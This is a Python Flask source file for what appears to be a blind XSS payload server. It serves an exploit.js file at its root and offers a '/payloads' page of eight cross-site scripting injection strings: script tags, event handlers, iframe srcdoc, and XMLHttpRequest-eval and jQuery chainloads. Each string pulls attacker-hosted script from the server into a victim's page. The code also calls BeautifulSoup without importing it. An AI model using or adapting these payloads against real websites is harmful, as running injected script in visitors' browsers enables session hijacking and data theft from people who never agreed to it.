import requests
import os
from flask import Flask, render_template, send_from_directory, request
from models.vulnerability import Vulnerability

app = Flask(__name__)

# Path to the exploit.js file for debugging purposes
EXPLOIT_FILE_PATH = os.path.abspath("templates/exploit/exploit.js")

@app.before_request
def before_request():
    # Store the current host in the context for use in templates
    request.current_host = request.host_url

@app.route("/")
def returnExploit():
    # Log the full path for debugging
    print(f"Looking for file at: {EXPLOIT_FILE_PATH}")
    if not os.path.exists(EXPLOIT_FILE_PATH):
        print("File does not exist!")
        return "File not found", 404
    return send_from_directory("templates/exploit", "exploit.js")

@app.route("/dashboard")
def dashboard():
    return render_template('dashboard-view.html')

# Functions for XSS payloads
def basic_script():
    return f'<script src="{request.current_host}"></script>'

def javascript_uri():
    return f"javascript:eval('document.createElement(\"script\").src=\"{request.current_host}\"')"

def input_onfocus():
    return f"<input onfocus='document.createElement(\"script\").src=\"{request.current_host}\";'>"

def image_onerror():
    return f"<img src='x' onerror='document.createElement(\"script\").src=\"{request.current_host}\";'>"

def video_source():
    return f"<video><source onerror='document.createElement(\"script\").src=\"{request.current_host}\"'></video>"

def iframe_srcdoc():
    return f"<iframe srcdoc='<script src=\"{request.current_host}\"></script>'></iframe>"

def xmlhttprequest_load():
    return f'<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{request.current_host}");a.send();</script>'

def jquery_chainload():
    return f'<script>$.getScript("{request.current_host}");</script>'

# Define the route for the payloads page
@app.route('/payloads')
def index():
    payloads = [
        {
            'func': basic_script,
            'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
            'description': 'Classic payload',
        },
        {
            'func': javascript_uri,
            'title': '<code>javascript:</code> URI Payload',
            'description': 'Link-based XSS',
        },
        {
            'func': input_onfocus,
            'title': '<code>&lt;input&gt;</code> Tag Payload',
            'description': 'HTML5 input-based payload',
        },
        {
            'func': image_onerror,
            'title': '<code>&lt;img&gt;</code> Tag Payload',
            'description': 'Image-based payload',
        },
        {
            'func': video_source,
            'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
            'description': 'Video-based payload',
        },
        {
            'func': iframe_srcdoc,
            'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
            'description': 'iframe-based payload',
        },
        {
            'func': xmlhttprequest_load,
            'title': 'XMLHttpRequest Payload',
            'description': 'Inline execution chainload payload',
        },
        {
            'func': jquery_chainload,
            'title': '<code>$.getScript()</code> (jQuery) Payload',
            'description': 'Chainload payload for sites with jQuery',
        },
    ]
    return render_template('payloads-view.jinja', payloads=payloads)

@app.route("/results")
def found_vulns_page():
    found_vulns = [Vulnerability('https://example.com', '#username', '/')]
    return render_template('results-view.jinja', found_vulns=found_vulns)

# Function to send a request and fetch page title (for scraping or other purposes)
def send_request():
    r = requests.get("https://example.com/")
    content = r.text
    soup = BeautifulSoup(content, 'html.parser')
    title = soup.title
    print("page title: " + title.text)

if __name__ == '__main__':
    app.run(debug=True)
